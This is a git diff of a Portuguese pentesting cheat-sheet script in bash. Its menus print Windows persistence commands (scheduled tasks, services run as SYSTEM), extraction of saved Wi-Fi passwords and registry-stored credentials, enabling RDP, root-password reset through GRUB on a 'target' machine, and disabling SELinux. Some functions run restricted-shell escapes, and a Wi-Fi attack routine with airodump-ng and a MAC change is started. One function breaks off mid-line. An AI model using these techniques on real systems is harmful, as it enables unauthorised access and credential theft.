-        echo -e "${RED}schtasks /create /tn \"nome_da_tarefa\" /tr \"path_do_script_ou_exe\" /sc \"minute\" /RU \"system\" ${GRAY}# Criar uma tarefa agendada, que será executada pelo usuário system, a cada minuto (Precisa ser executado por um terminal com privilégio [obter persistência após explorar um alvo]).${RESET}"
-        echo -e ""
-        echo -e "${RED}schtasks /run /I /TN \"nome_da_tarefa_agendada\" ${GRAY}# Executar imediatamente determinada tarefa agendada. ${RESET}"
-        echo -e "${RED}schtasks /delete /tn \"nome_da_tarefa\" ${GRAY}# Deletar uma tarefa agendada.${RESET}"
-        echo -e "${RED}schtasks /delete /tn \"windowsupdate\"${RESET}"
-        echo -e ""
-    }
-    function servicos_gerenciamento(){
-        echo -e "${WHITE}################### GERENCIAMENTO DE SERVIÇOS #######################${RESET}"
-        echo -e ""
-        echo -e "${RED}sc query ${GRAY}# lista os serviços ativos.${RESET}"
-        echo -e "${RED}sc query state= all ${GRAY}# Lista todos os serviços${RESET}"
-        echo -e ""
-        echo -e "${RED}wmic service get name,pathname,startmode,startname ${GRAY}# Mostra os serviços, com alguns filtros${RESET} "
-        echo -e ""
-        echo -e "${RED}sc query state= all | findstr \"NOME_DO_SERVIÇO\" ${GRAY}# Lista apenas os nomes dos serviços (Para Windows em português)${RESET}"
-        echo -e ""
-        echo -e "${RED}sc create \"nome_do_serviço\" binPath= \"caminho_do_executável\" DisplayName= \"descrição_do_serviço\" start= \"auto\" obj= \".\ LocalSystem\" ${GRAY}# Criar um novo serviço, que será executado pelo usuário system.${RESET}"
-        echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
-        echo -e "${YELLOW}${BG_BLACK}##### - Atenção para o espaço após os sinais de " = " !!! ######${RESET}"
-        echo -e "${YELLOW}${BG_BLACK}###############################################################${RESET}"
-        echo -e ""
-        echo -e "${RED}sc qc <nome_do_servico> ${GRAY}# Mostra configurações e informações de um serviço.${RESET}"
-        echo -e "${RED}sc start <nome_do_servico> ${GRAY}# Inicia um serviço${RESET}"
-        echo -e "${RED}sc stop <nome_do_servico> ${GRAY}# Para um serviço${RESET}"
-        echo -e "${RED}sc delete \"nome_do_serviço\" ${GRAY}# Exclui um serviço${RESET}"
-        echo -e "${RED}sc config <nome_do_servico> binPath= <novo_caminho_do_executavel> ${GRAY}# Exemplo de comando para mudar o caminho do executável que o serviço executa.${RESET}"
-        echo -e ""
-    }
-    function extracao_senhas(){
-        echo -e "${WHITE}################### EXTRAÇÃO DE SENHAS #######################${RESET}"
-        echo -e ""
-        echo -e "${RED}netsh wlan show profiles ${GRAY}# Mostra as redes wi-fi que estão salvas na maquina.${RESET}"
-        echo -e "${RED}netsh wlan show profiles name=\"nome_da_rede\" key=clear ${GRAY}# Exibe algumas informações da rede wi-fi salva, inclusive a senha em claro.${RESET}"
-        echo -e ""
 
+    # exibe um cabeçalho
+    echo
+    echo ">>>>>>>>>> COMANDOS LINUX <<<<<<<<<<"
+    echo
+
+    # exibe uma seção com comandos para gerenciamento de rede
+    echo -e "${RED}# Comandos uteis na gerencia de redes${RESET}"
+    echo
+
+    # exibe a sintaxe básica para os comandos
+    echo "Sintaxe -> comando (suite)"
+    echo
+
+    ### Listar tabela ARP
+
+    # exibe a seção para o comando arp
+    echo -e "${RED}## Listar tabela ARP${RESET}"
+    echo
+
+    # mostra como usar o comando arp (Net-tools & IP route) para listar a tabela ARP
+    echo "arp -a (Net-tools & IP route)"
+    echo
+
+    ### Exibir IPs configurados
+
+    # exibe a seção para os comandos ifconfig e ip addr
+    echo -e "${RED}## Exibir Ips configurados${RESET}"
+    echo
+
+    # mostra como usar o comando ifconfig (Net-tools) para exibir IPs configurados
+    echo "ifconfig -a (Net-tools)"
+
+    # mostra como usar o comando ip addr (IP route) para exibir IPs configurados
+    echo "ip addr (IP route)"
+    echo
+
+    ### Ativar/Desativar uma interface
+
+    # exibe a seção para os comandos ifconfig e ip link
+    echo -e "${RED}## Ativar/Desativar uma interface${RESET}"
+    echo
+
+    # mostra como usar o comando ifconfig eth0 up/down (Net-tools) para ativar/desativar a interface eth0
+    echo "ifconfig eth0 up/down (Net-tools)"
+
+    # mostra como usar o comando ip link set eth0 up/down (IP route) para ativar/desativar a interface eth0
+    echo "ip link set eth0 up/down (IP route)"
+
+    # observação sobre a interface eth0
+    echo -e "${GRAY}ps: eth0 refere-se a sua interface de rede. Para saber qual as suas interfaces, execute um dos comandos em 'Exibir Ips configurados'${RESET}"
+    echo
+
+    ### Exibir conexões ativas
+
+    # exibe a seção para os comandos netstat e ss
+    echo -e "${RED}## Exibe conexões ativas${RESET}"
+    echo
+
+    # mostra como usar o comando netstat (Net-tools) para exibir conexões ativas
+    echo "netstat (Net-tools)"
+
+    # mostra como usar o comando ss (IP route) para exibir conexões ativas
+    echo "ss (IP route)"
+
+    # observação sobre o comando ss para detectar shells indesejadas
+    echo -e "${GRAY}ps: para (talvez) saber se o chineizinho tem uma shell no seu computador, execute o comando 'ss -lntp'${RESET}"
+    echo
+
+    ### Exibir Rotas
+
+    # exibe a seção para os comandos route e ip route
+    echo -e "${RED}## Exibe Rotas${RESET}"
+    echo
+
+    # mostra como usar o comando route (Net-tools) para exibir rotas
+    echo "route (Net-tools)"
+
+    # mostra como usar o comando ip route (IP route) para exibir rotas
+    echo "ip route (IP route)"
+    echo
+
+    # exibe uma seção com informações sobre configurações de placa de rede
+    echo -e "${RED}# Configurações de Placa de Rede${RESET}"
+    echo
+
+    ### Configurações de rede em Debian
+
+    # explica como configurar a rede de forma persistente em sistemas derivados do Debian
+    echo -e "Nos sistemas derivados do ${RED}Debian${RESET}, a configuração persistente de rede é feita no arquivo ${RED}/etc/network/interfaces${RESET}"
+    echo
+
+    ### Configurações de rede em Red Hat Linux
+
+    # explica como configurar a rede de forma persistente em sistemas derivados do Red Hat Linux
+    echo -e "Nos sistemas derivados do ${RED}Red Hat Linux${RESET}, a configuração persistente de rede é configurada nos arquivos encontrados no diretório ${RED}/etc/sysconfig/network-scripts${RESET}"
+    echo
+
+    # pausa o script até que o usuário pressione ENTER
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    # chama a função main_menu para retornar ao menu principal
+    main_menu;
     }
-    function registros_windows(){
-        echo -e "${WHITE}################### REGISTRO DO WINDOWS #######################${RESET}"
-        echo -e "${RED}HKEY_CLASSES_ROOT (HKCR)${GRAY}: Presente nas versões atuais do Windows apenas para manter a compatibilidade com programas mais antigos.${RESET}"
-        echo -e "${RED}HKEY_CURRENT_USER (HKCU)${GRAY}: Contém todas as configurações do usuário logado no sistema.${RESET}"
-        echo -e "${RED}HKEY_LOCAL_MACHINE (HKLM)${GRAY}: Chave mais importante do registro, guarda todas as informações que o sistema operacional precisa para funcionar e de sua interface gráfica. Utiliza o arquivo SYSTEM para armazenar essas configurações.${RESET}"
-        echo -e "${RED}HKEY_USERS (HKU)${GRAY}: Guarda as configurações de aparência do Windows e as configurações efetuadas pelos usuários, como papel de parede, protetor de tela, temas e outros.${RESET}"
-        echo -e "${RED}HKEY_CURRENT_CONFIG (HKCC)${GRAY}: Salva os perfis de hardware utilizados pelo usuário.${RESET}"
-        echo -e "${RED}HKEY_LOCAL_MACHINE\Software\RegisteredApplications${GRAY} = subchave \"RegisteredApplications\" da subchave \"Software\" da chave HKEY_LOCAL_MACHINE.${RESET}"
-        echo -e ""
-        echo -e "${YELLOW}Através do registro do Windows, é possível mudar o comportamento padrão de alguns programas do Sistema Operacional, assim como é possível conseguir algumas informações importantes, como versão de programas, senhas, etc${RESET}"
-        echo -e "${GRAY}Exemplos:"
-        echo -e "   ${RED}\"HKLM\SOFTWARE\RealVNC\WinVNC4\" /v password ${GRAY}# O programa RealVNC salva a senha criptografada no seguinte valor do registro${RESET}"
-        echo -e "   ${RED}\"HKCU\Software\SimonTatham\PuTTY\" ${GRAY}# O programa PuTTY salva detalhes sobre conexões realizadas utilizando o programa, na seguinte subchave${RESET}"
-        echo -e "   ${RED}\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections ${GRAY}# O windows utiliza o seguinte valor para habilitar/desabilitar o acesso remoto ao sistema${RESET}"
-        echo -e ""
-        echo -e "${YELLOW}REGISTRO DO WINDOWS - Interagindo via terminal${RESET}"
-        echo -e "   ${RED}reg query chave\subchave\subchave\subchave ${GRAY}# Comando para ver os valores e subchaves contido no caminho especificado.${RESET} "
-        echo -e "   ${RED}reg query \"HKLM\SOFTWARE\WinRAR\Capabilities\FileAssociations\" ${GRAY}# Exemplo${RESET}"
-        echo -e "   ${RED}reg add <chave\subchave\subchave> ${GRAY}# Adicionar uma subchave no no registro"
-        echo -e "   ${RED}reg add <chave\subchave\subchave> /v <nome_do_valor> /t <tipo> /d <dado> ${GRAY}# Adicionar um valor no registro.${RESET}"
-        echo -e "   ${RED}reg delete <chave\subchave\subchave> ${GRAY}# Remover uma chave do registro${RESET}"
-        echo -e "   ${RED}reg save <chave\subchave\subchave arquivo_de_saida> ${GRAY}# Copiar chaves/subchaves para um arquivo.${RESET}"
-        echo -e ""
-        echo -e ">>> !!! IMPORTANTE !!! <<<   ${RED}reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f ${GRAY}# Ao editar essa chave, o protocolo RDP fica ativado na maquina${RESET}"
-    } 
-    function main_cmd_basicos_windows(){
-        comandos_basicos;
-        dir_cmd;
-        cd_cmd;
-        rd_cmd;
-        xcopy_cmd;
-        whoami_cmd;
-        tree_cmd;
-        shutdown_cmd;
-        findstr_cmd;
-        gamb_dir2find;
-        attrib_cmd;
-        cmd4enum_cmd;
-        icalcs;
-        system_info;
-        processos_gerenciamento;
-        usuarios_gerenciamento;
-        firewall_gerenciamento;
-        antivirus_gerenciamento;
-        tarefas_agendadas_gerenciamento
-        servicos_gerenciamento;
-        registros_windows;
-        outros;
+    # Define a função xiii_exemplos_find para explicar sobre o comando find
+    function xiii_exemplos_find(){
+    # limpa a tela
+    clear
+
+    # exibe um cabeçalho
+    echo
+    echo ">>>>>>>>>> COMANDOS LINUX - FIND & SEUS EXEMPLOS <<<<<<<<<<"
+    echo
+
+    ### Listar todos os arquivos em um diretório
+
+    # exibe a descrição e o comando para listar todos os arquivos em um diretório
+    echo -e "${RED}# exibe uma lista com todos os arquivos localizados em um determinado diretório, incluindo os arquivos armazenados nos subdiretórios.${RESET}"
+    echo -e "$ find ."
+    echo
+
+    ### Buscar por arquivos com maxdepth
+
+    # exibe a descrição e o comando para buscar por arquivos com um nível máximo de subdiretórios (maxdepth)
+    echo -e "${RED}# Condição que define o nível de 'profundidade' na navegação dos subdiretórios por meio do maxdepth.${RESET}"
+    echo -e "$ find /etc -maxdepth 1 -name *.sh"
+    echo
+
+    ### Buscar por arquivos com nome específico
+
+    # exibe a descrição e o comando para buscar por arquivos com nome específico usando curingas
+    echo -e "${RED}# Pesquisa por arquivos${RESET}"
+    echo -e "$ find ./test -type f -name <arquivo*>"
+    echo
+
+    ### Buscar por diretórios com nome específico
+
+    # exibe a descrição e o comando para buscar por diretórios com nome específico usando curingas
+    echo -e "${RED}# Pesquisa por diretórios${RESET}"
+    echo -e "$ find ./test -type d -name <diretorio*>"
+    echo
+
+    ### Buscar por arquivos ocultos
+
+    # exibe a descrição e o comando para buscar por arquivos ocultos
+    echo -e "${RED}# Pesquisa por arquivos ocultos${RESET}"
+    echo -e "$ find ~ -type f -name ".*""
+    echo
+
+    ### Buscar por arquivos com permissões específicas
+
+    # exibe a descrição e o comando para buscar por arquivos com permissões específicas
+    echo -e "${RED}# Pesquisa por arquivos com determinadas permissões${RESET}"
+    echo -e "# find / -type f -perm 0740 -type f -exec ls -la {} 2>/dev/null \;"
+    echo
+    echo -e "${RED}# Pesquisa por arquivos com permissões SUID${RESET}"
+    echo -e "# find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;"
+    echo
+
+
+    ### Buscar por arquivos do usuário específico
+
+    # exibe a descrição e o comando para buscar por arquivos do usuário específico
+    echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin${RESET}"
+    echo -e "$ find . –user msfadmin"
+    echo
+
+    ### Buscar por arquivos do usuário específico com extensão específica
+
+    # exibe a descrição e o comando para buscar por arquivos do usuário específico com extensão específica
+    echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin de extensão .txt${RESET}"
+    echo -e "$ find . –user msfadmin –name ‘*.txt’"
+    echo
+
+    ### Buscar por arquivos do grupo específico
+
+    # exibe a descrição e o comando para buscar por arquivos do grupo específico
+    echo -e "${RED}# Pesquisa por arquivos do grupo adm${RESET}"
+    echo -e "# find . –group adm"
+    echo
+
+    ### Buscar por arquivos modificados há N dias
+
+    # exibe a descrição e o comando para buscar por arquivos modificados há N dias
+    echo -e "${RED}# Pesquisa por arquivos modificados a N dias${RESET}"
+    echo -e "find / -mtime 5"
+    echo
+
+    ### Buscar por arquivos acessados há N dias
+
+    # exibe a descrição e o comando para buscar por arquivos acessados há N dias
+    echo -e "${RED}# Pesquisa por arquivos acessados a N dias${RESET}"
+    echo -e "# find / -atime 5"
+    echo
+
+    ### Buscar e executar comando com arquivos encontrados
+
+    # exibe a descrição e o comando para buscar por arquivos e executar um comando com cada um deles
+    echo -e "${RED}# Realiza a busca e executa comando com entradas encontradas.${RESET}"
+    echo -e "# find / -name "*.pdf" -type f -exec ls -lah {} \;"
+    echo
+
+    # pausa o script até que o usuário pressione ENTER
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    # chama a função main_menu para retornar ao menu principal
+    main_menu;
     }
-    main_cmd_basicos_windows | tee comandos_windows.txt;
-    echo "Arquivo comandos_windows.txt gerado para consultas"
-    pausa_script;
+    # Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no debian
+    function xiv_debian_memento_troca_senha_root(){
+    # limpa a tela
+    clear
+
+    # exibe um cabeçalho informativo
+    echo
+    echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Debian e derivados ###${RESET}"
+    echo
+
+    ### Passo 1: Reiniciar o computador
+
+    # instrui o usuário a reiniciar o computador alvo
+    echo -e " 1. ${RED}Reiniciar o computador alvo;${RESET}"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 2: Editar o menu do GRUB
+
+    # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
+    echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 3: Localizar e modificar a linha de comando
+
+    # instrui o usuário a localizar a linha que inicia com "linux boot..." e substituir "ro quiet" por "init=/bin/bash rw"
+    echo -e " 3. Procurar pela linha que inicia com ${RED}'linux boot…${RESET}', substituir ${RED}'ro quiet${RESET}' ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 4: Salvar as alterações e inicializar o sistema
+
+    # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
+    echo -e " 4. Pressione ${RED}'Ctrl+x'${RESET} para iniciar o sistema com os parâmetros alterados;"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 5: Definir a nova senha de root
+
+    # instrui o usuário a definir a nova senha de root após o sistema inicializar
+    echo -e " 5. Após a inicialização do sistema, execute ${RED}'passwd root'${RESET} e digite a nova senha."
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 6: Reinicializar o sistema
+
+    # instrui o usuário a reinicializar o sistema após definir a nova senha
+    echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'reboot -f'${RESET}"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Mensagem de confirmação
+
+    # exibe uma mensagem informando que a senha do root foi redefinida
+    echo
+    echo -e "${RED}### NESSE MOMENTO, SE DEU TUDO CERTO, VOCÊ POSSUI A SENHA DO ROOT USER ###${RESET}"
+    echo
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    # volta para o menu principal
+    main_menu;
+    }
+    # Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no redhat
+    function xv_redhat_memento_troca_senha_root(){
+    # limpa a tela
+    clear
+
+    # exibe um cabeçalho informativo
+    echo
+    echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Red Hat e derivados ###${RESET}"
+    echo
+
+    ### Passo 1: Reiniciar o computador
+
+    # instrui o usuário a reiniciar o computador alvo
+    echo -e " 1. ${RED}Reiniciar o computador alvo${RESET}"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 2: Editar o menu do GRUB
+
+    # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
+    echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 3: Localizar e modificar a linha de comando no CentOS/Fedora
+
+    # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en_US.UTF-8" por "init=/bin/bash rw" (para CentOS/Fedora)
+    echo -e " 3. Procurar pela linha que inicia com ${RED}'linux16...'${RESET}, substituir ${RED}'rghb quiet LANG=en_US.UTF-8${RESET} ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 4: Salvar as alterações e inicializar o sistema
+
+    # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
+    echo -e " 4. Pressione ${RED}'Ctrl\+x'${RESET} para iniciar o sistema com os parâmetros alterados;"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 5: Desabilitar o SELinux (somente CentOS/Fedora)
+
+    # informa ao usuário que o SELinux precisa ser desabilitado (apenas para CentOS/Fedora)
+    echo -e " 5. Após a inicialização do sistema, temos que desabilitar o SELinux. Para isso, edite o arquivo ${RED}'/etc/selinux/config'${RESET} e substitua a opção ${RED}'enforcing'${RESET} por ${RED}'disable'${RESET};"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 6: Reinicializar o sistema (somente CentOS/Fedora)
+
+    # instrui o usuário a reinicializar o sistema após desabilitar o SELinux (apenas para CentOS/Fedora)
+    echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'/sbin/halt –reboot \-f'${RESET}"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 7: Editar o menu do GRUB novamente (somente Rocky/Alma)
+
+    # informa ao usuário que o menu do GRUB precisa ser editado novamente (apenas para Rocky/Alma)
+    echo -e " 7. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"
+
+    # pausa o script até que o usuário pressione ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
+
+    ### Passo 8: Localizar e modificar a linha de comando no Rocky/Alma
+
+    # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en
+    }
+    # Definição da função xvi_vim_memento
+    function xvi_vim_memento(){
+    # Limpa a tela
+    clear
+
+    # Exibe cabeçalho do lembrete de uso do Vim
+    echo -e "${GREEN}============= LEMBRETE DE USO DO VIM =============${RESET}"
+    echo
+
+    # **Inserção de texto**
+    echo -e "${YELLOW}Inserção de texto:${RESET}"
+    echo -e "Pressione 'i' para entrar no modo de inserção."
+
+    # **Salvar e sair**
+    echo -e "\n${YELLOW}Salvar e sair:${RESET}"
+    echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':wq' para salvar e sair."
+
+    # **Sair sem salvar**
+    echo -e "\n${YELLOW}Sair sem salvar:${RESET}"
+    echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':q!' para sair sem salvar."
+
+    # **Movimentação pelo texto**
+    echo -e "\n${YELLOW}Movimentação pelo texto:${RESET}"
+    echo -e "Use as teclas de seta ou as teclas 'h', 'j', 'k' e 'l' para mover o cursor."
+
+    # **Excluir texto**
+    echo -e "\n${YELLOW}Excluir texto:${RESET}"
+    echo -e "Pressione 'x' para excluir o caractere sob o cursor."
+
+    # **Desfazer e refazer**
+    echo -e "\n${YELLOW}Desfazer e Refazer:${RESET}"
+    echo -e "Pressione 'u' para desfazer e 'Ctrl + r' para refazer."
+
+    # **Buscar e substituir**
+    echo -e "\n${YELLOW}Buscar e Substituir:${RESET}"
+    echo -e "Digite '/' para iniciar a busca. Para substituir, use ':s/palavra/nova_palavra/g'."
+
+    # **Ajuda**
+    echo -e "\n${YELLOW}Ajuda:${RESET}"
+    echo -e "Digite ':help' para obter ajuda."
+
+    # Exibe rodapé do lembrete de uso do Vim
+    echo -e "\n${GREEN}===================================================${RESET}"
+    echo
+
+    # Mensagem para pressionar ENTER para continuar
+    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
+    read -r 2> /dev/null
 
     # Chamada da função principal do menu principal após pressionar ENTER
     main_menu;
+    }
+    # Definição da função principal xvii_tec_esc_rbash
+    function xvii_tec_esc_rbash(){
+
+        # Definição da função vim_escape_rbash
+        function vim_escape_rbash(){
+            # Comando do Vim para escapar do rbash
+            local vim_comando="vim.tiny -E -c :\!/bin/sh"
+
+            # Verificar se o konsole está instalado
+            if command -v konsole &> /dev/null; then
+                    # KDE (Konsole)
+                    konsole --hold -e "${vim_comando}"
+            else
+                # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
+                if command -v gnome-terminal &> /dev/null; then
+                    # Ubuntu (Gnome Terminal)
+                    gnome-terminal -- "${vim_comando}"
+                elif command -v xfce4-terminal &> /dev/null; then
+                    # Xubuntu (Xfce Terminal)
+                    xfce4-terminal --execute "${vim_comando}"
+                elif command -v tilix &> /dev/null; then
+                    # Tilix está instalado
+                    tilix --action=app-new-window "${vim_comando}"
+                elif command -v xterm &> /dev/null; then
+                    # Terminal genérico (xterm)
+                    xterm -e "${vim_comando}"
+                else
+                    # Nenhum terminal padrão encontrado
+                    echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
+                    exit 1
+                fi
+            fi
+        }
+
+        # Definição da função find_escape_rbash
+        function find_escape_rbash(){
+            # Comando find para escapar do rbash
+            local find_comando="find . -exec /bin/sh \; -quit"
+
+            # Verificar se o Tilix está instalado
+            if command -v tilix &> /dev/null; then
+                # Tilix está instalado, abrir uma nova sessão do Tilix
+                tilix --action=app-new-window "${find_comando}"
+            else
+                # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
+                if command -v gnome-terminal &> /dev/null; then
+                    # Ubuntu (Gnome Terminal)
+                    gnome-terminal -- "${find_comando}"
+                elif command -v xfce4-terminal &> /dev/null; then
+                    # Xubuntu (Xfce Terminal)
+                    xfce4-terminal --execute "${find_comando}"
+                elif command -v konsole &> /dev/null; then
+                    # KDE (Konsole)
+                    konsole --hold -e "${find_comando}"
+                elif command -v xterm &> /dev/null; then
+                    # Terminal genérico (xterm)
+                    xterm -e "${find_comando}"
+                else
+                    # Nenhum terminal padrão encontrado
+                    echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
+                    exit 1
+                fi
+            fi
+        }
+
+        # Definição da função man_escape_rbash
+        function man_escape_rbash(){
+            # Comando man para escapar do rbash
+            local man_comando="echo 'Para escapar do rbash, logo apos o man iniciar, digite \!sh. Para continuar, aperte enter' && read && man man"
+
+            # Verificar se o Tilix está instalado
+            if command -v tilix &> /dev/null; then
+                # Tilix está instalado, abrir uma nova sessão do Tilix
+                tilix --action=app-new-window "${man_comando}"
+            else
+                # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
+                if command -v gnome-terminal &> /dev/null; then
+                    # Ubuntu (Gnome Terminal)
+                    gnome-terminal -- "${man_comando}"
+                elif command -v xfce4-terminal &> /dev/null; then
+                    # Xubuntu (Xfce Terminal)
+                    xfce4-terminal --execute "${man_comando}"
+                elif command -v konsole &> /dev/null; then
+                    # KDE (Konsole)
+                    konsole --hold -e "${man_comando}"
+                elif command -v xterm &> /dev/null; then
+                    # Terminal genérico (xterm)
+                    xterm -e "${man_comando}"
+                else
+                    # Nenhum terminal padrão encontrado
+                    echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
+                    exit 1
+                fi
+            fi
+        }
+
+        # Definição da função verifica_comandos_instalados
+        function verifica_comandos_instalados () {
+            # Verificar se o Vim está instalado e acessível
+            if command -v vim &> /dev/null; then
+                # Executar função para escapar do rbash com Vim
+                vim_escape_rbash;
+            else
+                # Verificar se o Find está instalado e acessível
+                if command -v find &> /dev/null; then
+                    # Executar função para escapar do rbash com Find
+                    find_escape_rbash;
+                # Verificar se o Man está instalado e acessível
+                elif command -v man &> /dev/null; then
+                    # Executar função para escapar do rbash com Man
+                    man_escape_rbash;
+                else
+                    # Nenhum dos comandos necessários está instalado
+                    echo "O script não é capaz de sair do rbash"    
+                fi
+            fi   
+        }
+
+        # Definição da função principal main_tec_esc_rbash
+        function main_tec_esc_rbash(){
+            # Chamar função para verificar comandos instalados e escapar do rbash
+            verifica_comandos_instalados;
+            pausa_script;
+        }
+
+        # Chamar função principal
+        main_tec_esc_rbash
+
+    }
+    # Este script realiza testes de penetração em redes wireless
+    function xviii_wifi_atk(){
+        ##############################################################
+        #
+        #           Wireless Pentest 
+        #
+        #           AUTOR: Z1GSN1FF3R||R3v4N||0wL 
+        #
+        #           DATA: 01-27-2021
+        #           REFATORADO: 04-22-2024    
+        #   
+        #           DESCRIÇÃO: Este script realiza testes de penetração em redes wireless.
+        #
+        #
+        ##############################################################
+        
+        # Função para executar configurações preliminares antes do ataque
+        function pre_configuracoes(){
+            # **Descrição:** Desliga a interface 'mon0' do modo monitor.
+
+            airmon-ng stop mon0
+
+            # **Explicação:**
+
+            # O comando `airmon-ng stop mon0` desativa a interface 'mon0' do modo monitor. 
+            # Isso é necessário para que a interface possa ser usada para outras finalidades, como se conectar a uma rede Wi-Fi.
+            # É importante notar que este comando pode falhar se a interface 'mon0' não estiver ativa no modo monitor.
+
+            # **Observações:**
+
+            # Certifique-se de que a interface 'mon0' esteja ativa no modo monitor antes de executar este comando.
+            # Se o comando falhar, tente verificar o status da interface com o comando `airmon-ng check`.
+        }
+
+        # Função para mostrar as interfaces wireless disponíveis e configurar a interface para o modo monitor
+        function interfaces_disponiveis(){
+            clear
+            #if #TODO: ADC UMA CHECAGEM IF AQUI PARA VERIFICAR A INTERFACE WIFI
+            #echo ""
+            #echo "=========== IW DISPONIVEIS ============="
+            #airmon-ng
+            #echo "=========== MONITOR MODE ============="
+            #read -p "Interface Wireless para entrar em modo monitor: " INTERFACE
+            #echo "======================================"
+            #echo ""
+        }        
+
+        # Função para realizar as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
+        function configuracoes_iniciais(){
+            # Desativa a interface de rede
+            ifconfig "${INTERFACE}" down
+
+            # Adiciona uma nova interface em modo monitor chamada mon0
+            iw dev "${INTERFACE}" interface add mon0 type monitor
+
+            # Altera o endereço MAC da interface mon0
+            macchanger -r mon0
+
+            # Verifica se há processos em execução que podem interferir e os encerra
+            airmon-ng check kill #kill the process that maybe cause some problem
+
+            # Solicita ao usuário para pressionar ENTER para continuar
+            echo -e "${GRAY} Pressione ENTER para continuar${RESET}" && read -r 2> /dev/null
+        }
+
+        # Função para iniciar o monitoramento em modo promíscuo
+        function monitoramento_promiscuo(){
+            # Obtém o timestamp atual para nomear o arquivo de log
+            local timestamp
+            timestamp=$(date +"%d%H%M%b%y")    
+
+            # Executa o comando airodump-ng para iniciar o monitoramento em modo promíscuo e escrever os resultados em um arquivo de log com o timestamp no nome
+            airodump-ng mon0 --write monitoramento_promiscuo_log"$timestamp"
+        }
+
+        # Função para escanear o Access Point (AP) alvo e escrever os resultados em um arquivo de log
+        function scan_ap_alvo(){    
+            echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
+            echo "============================================"
+
+            # Solicita ao usuário o BSSID (MAC do AP) do alvo
+            read -r -p "BSSID (MAC do AP) do alvo: " MACTARGET
+
+            # Solicita ao usuário o canal do AP
+            read -r -p "Canal do AP: " CHANNEL #TODO: ADC TRATAMENTO PARA FILTRAR O CANAL DO AP LOGO APÓS A INSERÇÃO DO BSSID
+
+            echo "============================================"
+            echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
+
+            # Executa o comando airodump-ng para escanear o AP alvo, utilizando o BSSID e o canal fornecidos pelo usuário, e escreve os resultados em um arquivo de log
